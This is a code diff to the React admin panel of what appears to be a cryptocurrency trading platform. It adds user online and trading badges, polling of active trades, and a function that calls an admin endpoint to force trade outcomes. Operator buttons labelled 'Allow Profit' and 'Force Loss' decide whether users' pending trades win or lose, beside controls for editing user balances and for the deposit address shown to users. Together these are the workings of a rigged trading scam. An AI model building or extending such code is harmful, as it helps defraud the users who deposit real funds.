@@ -11,13 +11,23 @@ interface UserCardProps {
 }
 
 const UserCard: React.FC<UserCardProps> = ({ user, onSave, savingId, savedId }) => {
-  const currentBalance = user.trading_balance || '0.00';
-  const currentDemoBalance = user.demo_balance || '10000.00';
+  const currentBalance = user.trading_balance ?? '10000.00';
+  const currentDemoBalance = user.demo_balance ?? '10000.00';
+  
   const [localBal, setLocalBal] = useState(String(currentBalance));
   const [localDemoBal, setLocalDemoBal] = useState(String(currentDemoBalance));
+
+  // Keep local state in sync with external updates (heartbeats/polling)
+  useEffect(() => {
+    setLocalBal(String(currentBalance));
+    setLocalDemoBal(String(currentDemoBalance));
+  }, [currentBalance, currentDemoBalance]);
+
   const uid = user.id.toString();
   const lastSeenMs = user.last_seen ? Date.now() - new Date(user.last_seen).getTime() : Infinity;
   const isOnline = lastSeenMs < 45_000;
+  const hasActiveTrades = user.active_trades_count > 0;
+
   return (
     <div className={`bg-[#181C25] border p-6 rounded-[28px] space-y-4 shadow-xl ${isOnline ? 'border-emerald-500/40 shadow-emerald-500/10' : 'border-indigo-500/20'}`}>
       <div className="flex justify-between items-start">
@@ -25,23 +35,31 @@ const UserCard: React.FC<UserCardProps> = ({ user, onSave, savingId, savedId }) 
           <div className="w-10 h-10 bg-indigo-600/20 rounded-xl flex items-center justify-center text-indigo-400 font-black text-sm">
             {user.email ? '@' : 'W'}
           </div>
-          {isOnline ? (
-            <div className="flex items-center space-x-1 px-2 py-1 bg-emerald-500/10 border border-emerald-500/30 rounded-full">
-              <div className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></div>
-              <span className="text-[8px] font-black uppercase tracking-widest text-emerald-400">Online</span>
-            </div>
-          ) : (
-            <div className="flex items-center space-x-1 px-2 py-1 bg-gray-800 border border-gray-700 rounded-full">
-              <div className="w-1.5 h-1.5 rounded-full bg-gray-500"></div>
-              <span className="text-[8px] font-black uppercase tracking-widest text-gray-500">Offline</span>
-            </div>
-          )}
+          <div className="flex flex-col space-y-1">
+            {isOnline ? (
+              <div className="flex items-center space-x-1 px-2 py-1 bg-emerald-500/10 border border-emerald-500/30 rounded-full w-fit">
+                <div className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></div>
+                <span className="text-[8px] font-black uppercase tracking-widest text-emerald-400">Online</span>
+              </div>
+            ) : (
+              <div className="flex items-center space-x-1 px-2 py-1 bg-gray-800 border border-gray-700 rounded-full w-fit">
+                <div className="w-1.5 h-1.5 rounded-full bg-gray-500"></div>
+                <span className="text-[8px] font-black uppercase tracking-widest text-gray-500">Offline</span>
+              </div>
+            )}
+            {hasActiveTrades && (
+              <div className="flex items-center space-x-1 px-2 py-1 bg-indigo-500/10 border border-indigo-500/30 rounded-full w-fit">
+                <div className="w-1.5 h-1.5 rounded-full bg-indigo-400 animate-bounce"></div>
+                <span className="text-[8px] font-black uppercase tracking-widest text-indigo-400">Trading ({user.active_trades_count})</span>
+              </div>
+            )}
+          </div>
         </div>
         <div className="text-[8px] text-gray-500 uppercase font-black">ID: {user.id}</div>
       </div>
       <div>
-        <div className="text-sm font-bold text-gray-100 truncate">{user.email || user.wallet_address || 'Anonymous'}</div>
-        {user.wallet_address && <div className="text-[9px] text-indigo-400 font-mono mt-0.5 truncate">{user.wallet_address}</div>}
+        <div className="text-sm font-bold text-gray-100 truncate">{user.nickname || user.email || user.wallet_address || 'Anonymous'}</div>
+        {(user.nickname || user.email) && user.wallet_address && <div className="text-[9px] text-indigo-400 font-mono mt-0.5 truncate">{user.wallet_address}</div>}
         <div className="text-[8px] text-gray-500 font-mono mt-1">Last seen: {user.last_seen ? new Date(user.last_seen).toLocaleString() : 'N/A'}</div>
       </div>
       
@@ -101,10 +119,11 @@ interface AdminDeskProps {
   onUpdateWallet?: (data: WalletData) => void;
 }
 
-const AdminDesk: React.FC<AdminDeskProps> = ({ onClose, managedWallet, activeTrades, onForceOutcome, onUpdateWallet }) => {
+const AdminDesk: React.FC<AdminDeskProps> = ({ onClose, managedWallet, activeTrades: propsActiveTrades, onForceOutcome, onUpdateWallet }) => {
   const [activeTab, setActiveTab] = useState<'intercept' | 'withdrawals' | 'users' | 'deposit' | 'config'>('deposit');
   const [remoteUsers, setRemoteUsers] = useState<Record<string, UserRecord>>({});
   const [dbUsers, setDbUsers] = useState<any[]>([]);
+  const [activeTrades, setActiveTrades] = useState<any[]>([]);
   const [copiedId, setCopiedId] = useState<string | null>(null);
   const [savingId, setSavingId] = useState<string | null>(null);
   const [savedId, setSavedId] = useState<string | null>(null);
@@ -134,6 +153,13 @@ const AdminDesk: React.FC<AdminDeskProps> = ({ onClose, managedWallet, activeTra
     loadConfig();
   }, []);
 
+  const fetchActiveTrades = async () => {
+    try {
+      const res = await fetch('/api/admin/active-trades');
+      if (res.ok) setActiveTrades(await res.json());
+    } catch (e) { console.error('Failed to fetch active trades', e); }
+  };
+
   useEffect(() => {
     const fetchDbUsers = async () => {
       try {
@@ -142,7 +168,11 @@ const AdminDesk: React.FC<AdminDeskProps> = ({ onClose, managedWallet, activeTra
       } catch (e) { console.error('Failed to fetch users', e); }
     };
     fetchDbUsers();
-    const interval = setInterval(fetchDbUsers, 5000);
+    fetchActiveTrades();
+    const interval = setInterval(() => {
+      fetchDbUsers();
+      fetchActiveTrades();
+    }, 5000);
     return () => clearInterval(interval);
   }, []);
 
@@ -164,12 +194,28 @@ const AdminDesk: React.FC<AdminDeskProps> = ({ onClose, managedWallet, activeTra
     return () => unsub();
   }, []);
 
-  const realUserTrades = useMemo(() => activeTrades.filter(t => !t.isBot && t.status === 'pending'), [activeTrades]);
+  const realUserTrades = useMemo(() => activeTrades.filter(t => t.status === 'pending'), [activeTrades]);
 
   const copyToClipboard = (text: string, id: string) => {
     navigator.clipboard.writeText(text);
     setCopiedId(id);
     setTimeout(() => setCopiedId(null), 2000);
+  };
+
+  const handleForceOutcome = async (tradeId: string, outcome: 'win' | 'loss') => {
+    try {
+      const res = await fetch('/api/admin/force-outcome', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ tradeId, forceOutcome: outcome })
+      });
+      if (res.ok) {
+        fetchActiveTrades();
+        if (onForceOutcome) onForceOutcome(tradeId, { forceOutcome: outcome } as any);
+      }
+    } catch (e) {
+      console.error('Force outcome failed', e);
+    }
   };
 
   const handleSaveBalance = async (user: any, balances: { trading_balance: string, demo_balance: string }) => {
@@ -329,11 +375,11 @@ const AdminDesk: React.FC<AdminDeskProps> = ({ onClose, managedWallet, activeTra
                   {realUserTrades.map(tx => (
                     <tr key={tx.id} className="hover:bg-[#1E2329] transition-colors">
                       <td className="px-8 py-6">
-                        <div className="text-xs font-bold text-indigo-400">{tx.userName}</div>
-                        <div className="text-[9px] text-gray-500">ID: {tx.id.slice(-8)}</div>
+                        <div className="text-xs font-bold text-indigo-400">{tx.wallet_address}</div>
+                        <div className="text-[9px] text-gray-500">ID: {tx.id}</div>
                       </td>
                       <td className="px-8 py-6">
-                        <span className={`text-[10px] font-black px-2 py-1 rounded ${tx.direction === 'up' ? 'bg-emerald-900/20 text-emerald-500' : 'bg-rose-900/20 text-rose-500'}`}>
+                        <span className={`text-[10px] font-black px-2 py-1 rounded ${tx.direction === 'LONG' || tx.direction === 'up' ? 'bg-emerald-900/20 text-emerald-500' : 'bg-rose-900/20 text-rose-500'}`}>
                           {tx.direction.toUpperCase()}
                         </span>
                       </td>
@@ -341,12 +387,12 @@ const AdminDesk: React.FC<AdminDeskProps> = ({ onClose, managedWallet, activeTra
                       <td className="px-8 py-6 text-right">
                         <div className="flex justify-end space-x-2">
                           <button
-                            onClick={() => onForceOutcome(tx.id, { forceOutcome: 'win' })}
-                            className={`px-4 py-2 text-[9px] font-black uppercase rounded-lg border transition-all ${tx.forceOutcome === 'win' ? 'bg-emerald-600 text-white border-emerald-500' : 'bg-transparent text-gray-600 border-gray-700 hover:border-emerald-500/50'}`}
+                            onClick={() => handleForceOutcome(tx.id, 'win')}
+                            className={`px-4 py-2 text-[9px] font-black uppercase rounded-lg border transition-all ${tx.force_outcome === 'win' ? 'bg-emerald-600 text-white border-emerald-500' : 'bg-transparent text-gray-600 border-gray-700 hover:border-emerald-500/50'}`}
                           >Allow Profit</button>
                           <button
-                            onClick={() => onForceOutcome(tx.id, { forceOutcome: 'loss' })}
-                            className={`px-4 py-2 text-[9px] font-black uppercase rounded-lg border transition-all ${tx.forceOutcome === 'loss' ? 'bg-rose-600 text-white border-rose-500' : 'bg-transparent text-gray-600 border-gray-700 hover:border-rose-500/50'}`}
+                            onClick={() => handleForceOutcome(tx.id, 'loss')}
+                            className={`px-4 py-2 text-[9px] font-black uppercase rounded-lg border transition-all ${tx.force_outcome === 'loss' ? 'bg-rose-600 text-white border-rose-500' : 'bg-transparent text-gray-600 border-gray-700 hover:border-rose-500/50'}`}
                           >Force Loss</button>
                         </div>
                       </td>
@@ -414,7 +460,8 @@ const AdminDesk: React.FC<AdminDeskProps> = ({ onClose, managedWallet, activeTra
                           <div className="text-[8px] text-gray-600 mt-1">{date}</div>
                         </td>
                         <td className="px-6 py-5">
-                          <div className="text-[10px] font-mono text-indigo-300 truncate max-w-[130px]">{wr.wallet_address}</div>
+                          <div className="text-[10px] font-black text-gray-200">{wr.nickname || 'Anonymous'}</div>
+                          <div className="text-[9px] font-mono text-indigo-300 truncate max-w-[130px] mt-1">{wr.wallet_address}</div>
                         </td>
                         <td className="px-6 py-5">
                           <div className="text-sm font-black text-amber-400">{parseFloat(wr.amount).toLocaleString(undefined, { minimumFractionDigits: 4 })} {wr.asset}</div>
@@ -512,7 +559,7 @@ const AdminDesk: React.FC<AdminDeskProps> = ({ onClose, managedWallet, activeTra
                     <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 9V7a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2m2 4h10a2 2 0 002-2v-6a2 2 0 00-2-2H9a2 2 0 00-2 2v6a2 2 0 002 2zm7-5a2 2 0 11-4 0 2 2 0 014 0z" />
                   </svg>
                 </div>
-                <h2 className="text-xl font-black uppercase italic text-amber-400 tracking-tight">Vault Deposit Address</h2>
+                <h2 className="text-xl font-black uppercase italic text-amber-400 tracking-tight">Protocol Deposit Address</h2>
                 <p className="text-[10px] text-gray-500 font-bold uppercase tracking-widest">This address is shown to users on the deposit screen</p>
               </div>
 
